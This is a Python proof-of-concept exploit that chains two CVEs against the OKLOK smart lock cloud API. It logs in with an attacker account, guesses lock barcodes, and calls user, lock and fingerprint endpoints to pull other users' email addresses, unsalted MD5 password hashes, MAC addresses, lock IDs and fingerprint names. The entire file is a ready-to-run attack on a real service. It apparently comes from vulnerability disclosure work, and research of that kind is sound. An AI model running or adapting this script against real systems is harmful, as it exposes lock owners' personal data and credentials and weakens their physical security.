#!/usr/bin/env python3

#PoC
#Chain CVE-2020-8792 with CVE-2020-8791
#Obtain OKLOK email address, lock name, unsalted MD5 password hash, fingerprint name, etc, from constructed barcode

import requests
import json
import sys
import getpass

#login to attacker account to get attacker token for subsequent HTTP requests
def login_attacker(attacker_email_address, attacker_password):
        
    login_url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'
    login_body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}

    login_headers = {'Host': 'app.oklok.com.cn',
    'Content-Type': 'application/json',
    'Connection': 'keep-alive',
    'Accept': '*/*',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Accept-Language': 'en-US;q=1',
    'Content-Length': '70',
    'Accept-Encoding': 'gzip, deflate, br'}

    print('\n-------------------------------------------------------------')
    print('[*] Logging in...')
    
    response = requests.post(login_url, data=json.dumps(login_body), headers=login_headers)
    json_resp = response.json()
    status = json_resp['status']
    if status == '2000':
        print('[*] Login successful\n')
        print('=============================================================')
        print('ATTACKER LOGIN DETAILS:')
        print('=============================================================')
        result = json_resp['result']
        attacker_token = result['token']
        attacker_userId = result['userId']
        print('attacker_token: ' + str(attacker_token))
        print('attacker_userId: ' + str(attacker_userId))
        print('-------------------------------------------------------------\n')
        return attacker_token

    else:
        sys.exit('[*] Login not successful.')

#construct barcode guess
#grab email address and lock name
#get userId to use in next function
def querydevice(number, attacker_token, headers):

    prefix_choice = input('Choose a 4-char prefix: \n1. GFYY\n2. UBAN\n3. XBAN\n4. UFCY\n5. UFAY\n6. UBAY\n7. QBAN\n8. Other\n')

    other=''
    if prefix_choice == '8':
        other = input('\nEnter a 4-char prefix:\n')
        if len(other) != 4:
            sys.exit('Incorrect prefix length.')

    prefix = {1: 'GFYY', 2: 'UBAN', 3: 'XBAN', 4: 'UFCY', 5: 'UFAY', 6: 'UBAY', 7: 'QBAN', 8: other}
    if prefix_choice not in ('1', '2', '3', '4', '5', '6', '7', '8'):
        sys.exit('Invalid choice.')

    qd_url = 'https://app.oklok.com.cn/oklock/lock/getDeviceInfo'

    number = str(number).zfill(8)
    barcode = prefix.get(int(prefix_choice)) + number
    print('-------------------------------------------------------------')
    print(f'[*] Querying device by barcode {barcode}...')
    qd_body = {"barcode":barcode}
    response = requests.post(qd_url, data=json.dumps(qd_body), headers=headers)
    json_resp = response.json()
    status = json_resp['status']
    result = json_resp['result']
    if status == '2000':
        if len(result)!=0:
            print('[*] Barcode found\n')
            print('=============================================================')
            print('USER ACCOUNT/LOCK INFO:')
            print('=============================================================')
            email_address = result['account']
            lock_name = result['name']
            userId = str(result['userId'])
            print('email address: ' + str(email_address))
            print('lock name: ' + str(lock_name))
            print('userId: ' + userId)
            scan_id(userId, attacker_token, headers)
            print('-------------------------------------------------------------\n')
        else:
            print('[*] No results found')
            print('-------------------------------------------------------------\n')
    else:
        print('HTTP Error - Device could not be queried.')
        print('-------------------------------------------------------------\n')

#get password hash, lock name, print name, etc.
def scan_id(userId, attacker_token, headers):

    get_user_info = 'https://app.oklok.com.cn/oklock/user/getInfo'
    get_lock_info = 'https://app.oklok.com.cn/oklock/lock/getLockList'
    get_fingerprints_info = 'https://app.oklok.com.cn/oklock/lock/fingerprintList'              

    body = {"userId":userId}

    user_info = requests.post(get_user_info, data=json.dumps(body), headers=headers)
    lock_info = requests.post(get_lock_info, data=json.dumps(body), headers=headers)

    json_user_info = user_info.json()
    json_lock_info = lock_info.json()

    user_result = json_user_info['result']
    user_status = json_user_info['status']

    lock_result = json_lock_info['result']
    lock_status = json_lock_info['status']
    if user_status == '2000':
        if len(user_result)!=0:
            acct_creation = user_result['createAt']
            cid = user_result['cid']
            nickname = user_result['nickName']
            password_hash = user_result['password']
            qrUrl = user_result['qrUrl']
            picUrl = user_result['picUrl']
            print('account creation: ' + str(acct_creation))
            print('cid: ' + str(cid))
            print('nickname: ' + str(nickname))
            print('password hash: ' + str(password_hash))
            print('qrUrl: ' + str(qrUrl))
            print('picUrl: ' + str(picUrl))
    else:
        print('HTTP Error - Could not retrieve some user info.')

    if lock_status == '2000':
        if len(lock_result)!=0:
            mac_address = lock_result[0]['mac']
            barcode = lock_result[0]['barcode']
            lockId = lock_result[0]['id']

            body_fingerprints = {"userId":userId, "lockId":lockId}
            fingerprints_info = requests.post(get_fingerprints_info, data=json.dumps(body_fingerprints), headers=headers)
            json_prints_info = fingerprints_info.json()
            prints_result = json_prints_info['result']
            prints_status = json_prints_info['status']
            if prints_status == '2000':
                if len(prints_result)!=0:
                    prints_name = prints_result[0]['name']
                else:
                    prints_name = 'N/A'
            print('mac address: ' + str(mac_address))
            print('barcode: ' + str(barcode))
            print('lockId: ' + str(lockId))
            print('registered prints: ' + str(prints_name))

        else:
            print('lock name: N/A')
            print('mac address: N/A')
            print('barcode: N/A')
            print('lockId: N/A')
            print('registered prints: N/A')
    else:
        print('HTTP Error - Could not retrieve lock info')


def main():

    if len(sys.argv) is not 3:
        sys.exit('Usage: python3 ownklok_chain.py <number> <attacker_email_address>')
    elif len(sys.argv[1]) > 8:
        sys.exit('Too many digits (must be <= 8).')
    elif int(sys.argv[1]) < 0:
        sys.exit('Usage: python3 ownklok_chain.py <number> <attacker_email_address>. Cannot use a negative number.')
    else:
        number = int(sys.argv[1])
        attacker_email_address = sys.argv[2]
        attacker_password = getpass.getpass('Attacker Password: ')

    attacker_token = login_attacker(attacker_email_address, attacker_password)

    headers = {'Host': 'app.oklok.com.cn',
    'phoneModel': 'iPhone11,8',
    'Accept': '*/*',
    'appVersion': '3.1.1',
    'Accept-Language': 'en-US;q=1',
    'Accept-Encoding': 'gzip, deflate, br',
    'token': attacker_token,
    'Content-Type': 'application/json',
    'clientType': 'iOS',
    'language': 'en-US',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Connection': 'keep-alive',
    'osVersion': '13.3'}  

    querydevice(number, attacker_token, headers)


if __name__ == '__main__':
    main()
